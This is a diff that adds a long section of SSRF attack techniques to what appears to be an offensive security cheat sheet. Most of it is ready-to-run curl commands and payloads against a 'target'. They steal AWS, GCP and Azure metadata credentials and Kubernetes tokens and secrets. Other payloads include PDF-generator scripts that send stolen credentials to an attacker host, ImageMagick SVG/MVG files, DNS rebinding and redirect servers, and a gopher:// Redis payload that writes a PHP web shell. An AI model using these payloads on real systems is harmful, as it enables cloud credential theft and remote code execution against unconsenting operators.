@@ -617,3 +617,446 @@ credentials for the role attached to the instance.
 - https://portswigger.net/web-security/ssrf
 - https://github.com/taviso/rbndr
 - https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/
+
+---
+
+## 2026 SSRF Techniques
+
+### 1. Cloud Metadata v2 (IMDSv2) Bypass Techniques
+
+IMDSv2 requires a PUT request with `X-aws-ec2-metadata-token-ttl-seconds` header to get a token, then use that token in subsequent GET requests. This blocks most simple SSRF but can still be bypassed.
+
+```bash
+# Standard IMDSv2 flow (what the server does internally)
+TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -s "http://169.254.169.254/latest/meta-data/" \
+  -H "X-aws-ec2-metadata-token: $TOKEN"
+
+# Bypass 1: If SSRF allows arbitrary HTTP method + headers (full request control)
+# Some fetch libraries let you control method and headers:
+curl -sk "https://target/fetch?url=http://169.254.169.254/latest/api/token&method=PUT&headers=X-aws-ec2-metadata-token-ttl-seconds:21600"
+
+# Bypass 2: SSRF via CRLF injection to smuggle PUT into GET
+curl -sk "https://target/fetch?url=http://169.254.169.254/latest/api/token%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600"
+
+# Bypass 3: Container metadata (ECS/Fargate) — does NOT require token
+curl -sk "https://target/fetch?url=http://169.254.170.2/v2/credentials/$(cat /proc/self/environ | tr '\0' '\n' | grep AWS_CONTAINER_CREDENTIALS | cut -d= -f2)"
+# The GUID is in env var AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+
+# Bypass 4: If hop limit is set to > 1, SSRF from another EC2 instance can reach IMDSv2
+# Check: aws ec2 describe-instances --query 'Reservations[].Instances[].MetadataOptions'
+
+# Bypass 5: ECS task metadata v4 (no token needed)
+curl -sk "https://target/fetch?url=http://169.254.170.2/v4/$(echo $ECS_CONTAINER_METADATA_URI | cut -d/ -f4-)"
+
+# Test all AWS metadata paths through SSRF sink
+for path in \
+  "/latest/meta-data/" \
+  "/latest/meta-data/iam/security-credentials/" \
+  "/latest/user-data/" \
+  "/latest/dynamic/instance-identity/document" \
+  "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"; do
+  echo -n "[$path] "
+  curl -sk -m 5 "https://target/fetch?url=http://169.254.169.254$path" | head -c 200
+  echo
+done
+```
+
+### 2. GCP Metadata Server Differences
+
+```bash
+# GCP requires Metadata-Flavor: Google header (but SSRF libraries often let you set headers)
+# Key difference from AWS: single endpoint, header-based auth, no token dance
+
+# If SSRF allows custom headers:
+curl -sk "https://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true" \
+  -H "Metadata-Flavor: Google"
+
+# GCP-specific metadata paths
+for path in \
+  "/computeMetadata/v1/instance/service-accounts/default/token" \
+  "/computeMetadata/v1/instance/service-accounts/default/email" \
+  "/computeMetadata/v1/instance/attributes/kube-env" \
+  "/computeMetadata/v1/instance/attributes/startup-script" \
+  "/computeMetadata/v1/project/project-id" \
+  "/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip" \
+  "/computeMetadata/v1/instance/service-accounts/"; do
+  echo -n "[GCP $path] "
+  curl -sk -m 5 "https://target/fetch?url=http://metadata.google.internal$path" \
+    -H "Metadata-Flavor: Google" | head -c 200
+  echo
+done
+
+# Bypass Metadata-Flavor check via URL tricks
+# Some apps add the header themselves if the URL contains "metadata.google.internal"
+# Try alternative hostnames that resolve to 169.254.169.254:
+curl -sk "https://target/fetch?url=http://169.254.169.254/computeMetadata/v1/" \
+  -H "Metadata-Flavor: Google"
+
+# GCP Cloud Functions metadata
+curl -sk "https://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
+  -H "Metadata-Flavor: Google"
+# Returns: {"access_token":"ya29.xxx","expires_in":3600,"token_type":"Bearer"}
+```
+
+### 3. Azure IMDS Endpoint Testing
+
+```bash
+# Azure requires Metadata: true header
+# Instance metadata
+curl -sk "https://target/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
+  -H "Metadata: true"
+
+# Azure managed identity token (the crown jewel)
+curl -sk "https://target/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/" \
+  -H "Metadata: true"
+
+# Azure-specific paths
+for path in \
+  "/metadata/instance?api-version=2021-02-01" \
+  "/metadata/instance/compute?api-version=2021-02-01" \
+  "/metadata/instance/network?api-version=2021-02-01" \
+  "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+  "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
+  "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com" \
+  "/metadata/instance/compute/userData?api-version=2021-01-01&format=text"; do
+  echo -n "[Azure $path] "
+  curl -sk -m 5 "https://target/fetch?url=http://169.254.169.254$path" \
+    -H "Metadata: true" | head -c 200
+  echo
+done
+
+# Azure App Service hidden metadata
+curl -sk "https://target/fetch?url=http://169.254.130.1/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/"
+```
+
+### 4. Kubernetes Service Account Token Theft via SSRF
+
+```bash
+# Read service account token (mounted in every pod by default)
+curl -sk "https://target/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token"
+curl -sk "https://target/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+curl -sk "https://target/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/namespace"
+
+# Access Kubernetes API with stolen token
+TOKEN=$(curl -sk "https://target/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token")
+# Then via SSRF:
+curl -sk "https://target/fetch?url=https://kubernetes.default.svc/api/v1/namespaces/default/secrets" \
+  -H "Authorization: Bearer $TOKEN"
+
+# Kubelet API (often unauthenticated on port 10255)
+curl -sk "https://target/fetch?url=http://127.0.0.1:10255/pods"
+curl -sk "https://target/fetch?url=http://127.0.0.1:10255/metrics"
+
+# etcd (if accessible — contains ALL cluster secrets)
+curl -sk "https://target/fetch?url=http://127.0.0.1:2379/v2/keys/?recursive=true"
+
+# Kubernetes environment variables (may contain other service URLs)
+curl -sk "https://target/fetch?url=file:///proc/self/environ" | tr '\0' '\n' | grep -i kube
+
+# Common Kubernetes service discovery via DNS
+for svc in "kubernetes" "kube-dns.kube-system" "metrics-server.kube-system" \
+           "dashboard.kubernetes-dashboard" "elasticsearch.logging"; do
+  curl -sk -m 3 "https://target/fetch?url=http://$svc/" && echo "FOUND: $svc"
+done
+```
+
+### 5. SSRF via PDF Generators
+
+```bash
+# wkhtmltopdf — converts HTML to PDF, fetches all referenced URLs server-side
+# Inject into any field that gets rendered into a PDF (invoices, reports, tickets)
+
+# Basic SSRF via <iframe>
+PAYLOAD='<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="600"></iframe>'
+curl -sk -X POST "https://target/api/generate-pdf" \
+  -H "Content-Type: application/json" \
+  -d "{\"html\":\"$PAYLOAD\"}" -o /tmp/ssrf.pdf
+
+# SSRF via <link> stylesheet
+PAYLOAD='<link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">'
+
+# SSRF via <img> tag
+PAYLOAD='<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">'
+
+# SSRF via @font-face
+PAYLOAD='<style>@font-face{font-family:x;src:url("http://169.254.169.254/latest/meta-data/")}</style>'
+
+# SSRF via XMLHttpRequest in PDF context
+PAYLOAD='<script>
+var x = new XMLHttpRequest();
+x.open("GET","http://169.254.169.254/latest/meta-data/iam/security-credentials/",false);
+x.send();
+new Image().src="http://ATTACKER/?data="+btoa(x.responseText);
+</script>'
+
+# Puppeteer/Chrome headless SSRF (commonly used for screenshot/PDF services)
+# Test with file:// protocol
+PAYLOAD='<iframe src="file:///etc/passwd"></iframe>'
+curl -sk -X POST "https://target/api/screenshot" \
+  -H "Content-Type: application/json" \
+  -d "{\"url\":\"data:text/html,$(echo -n "$PAYLOAD" | jq -sRr @uri)\"}"
+
+# Test local service access via headless browser
+curl -sk -X POST "https://target/api/screenshot" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:6379/"}'
+```
+
+### 6. SSRF via Image Processing
+
+```bash
+# ImageMagick SSRF via SVG (ImageMagick processes SVG which can reference URLs)
+cat > /tmp/ssrf.svg <<'EOF'
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="400" height="400"/>
+</svg>
+EOF
+curl -sk -X POST "https://target/upload" -F "file=@/tmp/ssrf.svg;type=image/svg+xml"
+
+# ImageMagick MVG format SSRF
+cat > /tmp/ssrf.mvg <<'EOF'
+push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+pop graphic-context
+EOF
+curl -sk -X POST "https://target/upload" -F "file=@/tmp/ssrf.mvg"
+
+# ImageMagick via ephemeral: or url: pseudo-protocols
+# If app calls: convert input.jpg -resize 100x100 output.jpg
+# Upload a file named: 'http://169.254.169.254/latest/meta-data/|.jpg'
+
+# GraphicsMagick similar vectors
+# Sharp (Node.js) — typically not vulnerable to SSRF directly, but if it
+# processes SVG through librsvg, same SVG SSRF applies
+
+# SSRF via EXIF/XMP metadata in images (apps that read metadata URLs)
+exiftool -XMP-dc:Source="http://169.254.169.254/latest/meta-data/" /tmp/test.jpg
+curl -sk -X POST "https://target/upload" -F "file=@/tmp/test.jpg"
+```
+
+### 7. SSRF via Webhook/Callback Features
+
+```bash
+# Webhook registration — many SaaS apps let you set a callback URL
+# Register webhook pointing to internal services
+curl -sk -X POST "https://target/api/webhooks" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"url":"http://169.254.169.254/latest/meta-data/","events":["order.created"]}'
+
+# Webhook URL validation bypass patterns
+# Some apps validate the URL on creation but not on trigger:
+# 1. Register with valid URL
+# 2. Update to internal URL
+# 3. Or: register with redirect URL that 302s to internal
+
+# Common webhook-like features to test:
+# - Slack integration URLs
+# - Payment gateway callback URLs
+# - Email notification preview URLs
+# - Import from URL features
+# - RSS/Atom feed readers
+# - URL preview/unfurl (like Slack link previews)
+# - "Test connection" buttons for integrations
+
+# Test URL unfurling SSRF
+curl -sk -X POST "https://target/api/messages" \
+  -H "Content-Type: application/json" \
+  -d '{"text":"Check this: http://169.254.169.254/latest/meta-data/"}'
+
+# OAuth callback SSRF (set redirect_uri to internal)
+curl -sk "https://target/oauth/callback?redirect_uri=http://169.254.169.254/latest/meta-data/"
+```
+
+### 8. DNS Rebinding for SSRF
+
+```bash
+# DNS rebinding bypasses allowlist checks that validate the domain at resolution time
+# 1. First DNS lookup: resolves to legitimate IP (passes check)
+# 2. Second DNS lookup (actual fetch): resolves to internal IP
+# TTL must be 0 or very low
+
+# Using rbndr.us service
+# Format: <hex-ip1>.<hex-ip2>.rbndr.us alternates between two IPs
+# 7f000001 = 127.0.0.1, a]9fea9fe = 169.254.169.254
+REBIND="7f000001.a9fea9fe.rbndr.us"
+curl -sk "https://target/fetch?url=http://$REBIND/"
+
+# Using 1u.ms service (more control)
+# make-<ip1>-rebind-<ip2>-rr.1u.ms
+REBIND="make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms"
+curl -sk "https://target/fetch?url=http://$REBIND/latest/meta-data/"
+
+# Self-hosted DNS rebinding with singularity
+# git clone https://github.com/nccgroup/singularity.git
+# Configure to alternate between public IP and 169.254.169.254
+
+# Python DNS rebinding server
+python3 -c "
+import socket, struct, threading
+# Quick DNS server that alternates responses
+# First query: return legitimate IP
+# Second query: return 127.0.0.1
+# Requires setting up NS records for your domain
+print('Set up NS records for rebind.yourserver.tld pointing to this server')
+print('Then use: https://target/fetch?url=http://test.rebind.yourserver.tld/')
+"
+```
+
+### 9. SSRF via HTTP Redirect Chains
+
+```bash
+# Many SSRF protections check the initial URL but follow redirects blindly
+# Host a redirect on your server:
+
+# On attacker server (redirect.php):
+# <?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>
+
+# Test if target follows redirects
+curl -sk "https://target/fetch?url=http://yourserver.tld/redirect.php"
+
+# Use URL shorteners as redirectors (if the target allows them)
+# bit.ly, tinyurl.com, etc.
+
+# Chain multiple redirects to confuse validation
+# redirect1.php → redirect2.php → http://169.254.169.254/
+
+# 302 redirect via HTTP response
+python3 -c "
+from http.server import HTTPServer, BaseHTTPRequestHandler
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
+        self.end_headers()
+HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
+" &
+
+# Test redirect chain
+curl -sk "https://target/fetch?url=http://yourserver.tld:8888/"
+
+# Meta refresh redirect (if HTML is parsed)
+# <meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/meta-data/">
+
+# JavaScript redirect (if the fetcher executes JS)
+# <script>location='http://169.254.169.254/latest/meta-data/'</script>
+```
+
+### 10. gopher:// and dict:// Protocol Abuse
+
+```bash
+# gopher:// — send raw TCP data to any port (Redis, Memcached, SMTP, FastCGI)
+
+# Redis: Write webshell via CONFIG SET
+# Use Gopherus to generate payloads:
+python3 ~/tools/Gopherus/gopherus.py --exploit redis
+# Input: php (for PHP reverse shell)
+# Copy the generated gopher:// URL
+
+# Redis SSRF — manual payload construction
+# Commands: CONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET x "<?php system($_GET['c']); ?>"\r\nSAVE\r\n
+PAYLOAD="gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0Ax%0D%0A%2428%0D%0A%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A"
+curl -sk "https://target/fetch?url=$PAYLOAD"
+
+# Memcached via gopher (store poisoned cache entries)
+python3 ~/tools/Gopherus/gopherus.py --exploit phpmemcache
+
+# FastCGI via gopher (PHP-FPM RCE)
+python3 ~/tools/Gopherus/gopherus.py --exploit fastcgi
+# Input: /var/www/html/index.php (path to any PHP file on disk)
+
+# dict:// — service banner grabbing and simple command execution
+curl -sk "https://target/fetch?url=dict://127.0.0.1:6379/INFO"
+curl -sk "https://target/fetch?url=dict://127.0.0.1:11211/stats"
+curl -sk "https://target/fetch?url=dict://127.0.0.1:6379/CONFIG%20GET%20dir"
+
+# Scan for common services via dict://
+for port in 6379 11211 3306 5432 25 587 110 143; do
+  echo -n "dict://$port: "
+  curl -sk -m 3 "https://target/fetch?url=dict://127.0.0.1:$port/info" | head -c 100
+  echo
+done
+```
+
+### 11. SSRF in GraphQL Introspection Endpoints
+
+```bash
+# GraphQL endpoints sometimes fetch schemas from remote URLs
+# or have features that make HTTP requests (subscriptions, federation)
+
+# Test GraphQL introspection for URL-fetching fields
+curl -sk -X POST "https://target/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name fields { name args { name type { name } } } } } }"}'  \
+  | jq '.data.__schema.types[].fields[]? | select(.args[]?.type.name == "String") | .name' \
+  | grep -iE 'url|uri|link|fetch|load|import|webhook|callback'
+
+# Apollo Federation — if the target uses federation, the gateway fetches schemas from service URLs
+# Look for _service { sdl } queries and service registration endpoints
+curl -sk -X POST "https://target/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ _service { sdl } }"}'
+
+# GraphQL mutations that accept URLs
+curl -sk -X POST "https://target/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { importData(url: \"http://169.254.169.254/latest/meta-data/\") { status } }"}'
+
+# GraphQL subscriptions via WebSocket — may connect to internal services
+# wscat -c wss://target/graphql -x '{"type":"connection_init"}'
+```
+
+### 12. IPv6 SSRF Bypasses
+
+```bash
+# Many SSRF protections only check IPv4 addresses, ignoring IPv6
+
+# ::1 (IPv6 loopback = 127.0.0.1)
+curl -sk "https://target/fetch?url=http://[::1]/"
+curl -sk "https://target/fetch?url=http://[::1]:6379/"
+
+# IPv4-mapped IPv6 (::ffff:127.0.0.1)
+curl -sk "https://target/fetch?url=http://[::ffff:127.0.0.1]/"
+curl -sk "https://target/fetch?url=http://[::ffff:169.254.169.254]/"
+
+# IPv4-compatible IPv6
+curl -sk "https://target/fetch?url=http://[::127.0.0.1]/"
+
+# IPv6 with zone ID (may confuse parsers)
+curl -sk "https://target/fetch?url=http://[::1%2525eth0]/"
+
+# Hex IPv6 representations
+curl -sk "https://target/fetch?url=http://[0:0:0:0:0:0:0:1]/"
+curl -sk "https://target/fetch?url=http://[0:0:0:0:0:ffff:7f00:1]/"
+
+# URL-encoded brackets
+curl -sk "https://target/fetch?url=http://%5B::1%5D/"
+
+# Combine with port scanning
+for port in 80 443 6379 8080 3306 5432 9200 27017; do
+  echo -n "[::1]:$port → "
+  curl -sk -m 3 "https://target/fetch?url=http://[::1]:$port/" | head -c 100
+  echo
+done
+
+# Full bypass wordlist for internal access
+for addr in \
+  "http://[::1]/" \
+  "http://[::ffff:127.0.0.1]/" \
+  "http://[::ffff:169.254.169.254]/" \
+  "http://[0:0:0:0:0:0:0:1]/" \
+  "http://[0:0:0:0:0:ffff:a9fe:a9fe]/" \
+  "http://0000::1/" \
+  "http://127.1/" \
+  "http://2130706433/" \
+  "http://017700000001/" \
+  "http://0x7f000001/"; do
+  echo -n "$addr → "
+  curl -sk -m 3 "https://target/fetch?url=$addr" -o /dev/null -w '%{http_code} %{size_download}bytes'
+  echo
+done
+```
